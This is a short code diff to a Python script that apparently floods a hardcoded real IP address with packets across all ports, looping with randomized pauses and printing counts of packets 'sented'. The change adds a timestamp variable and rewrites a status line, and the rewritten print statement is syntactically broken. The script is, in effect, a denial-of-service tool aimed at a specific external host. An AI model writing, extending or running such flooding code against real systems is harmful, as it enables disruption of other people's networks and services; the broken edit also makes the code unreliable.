@@ -69,13 +69,14 @@ time.sleep(1)
 sent = 0
 i = 600
 timeR = i + random.randint(0,20)
+dtime = now.strftime("%Y-%m-%d %H:%M:%S")
 
 if port_mode == False:  # All ports.
     try:
         while True:
             if port == 65534:
                 port = 1
-                print('\033[32;1m[now.strftime("%Y-%m-%d %H:%M:%S")]Sented 65535 packets to 103.215.51.90 through port:All\033[0m')
+                print('\033[%s]Sented 65535 packets to 103.215.51.90 through port:All\033[0m'%(dtime)
                 print('\033[1;36m/wait %s'%(timeR))
                 time.sleep(timeR)
                 
@@ -87,6 +88,7 @@ if port_mode == False:  # All ports.
             sent += 1
             port += 1
             timeR = i + random.randint(0,20)
+            dtime = now.strftime("%Y-%m-%d %H:%M:%S")
             
     except:
         print('\n\033[31;1mExited\033[0m')
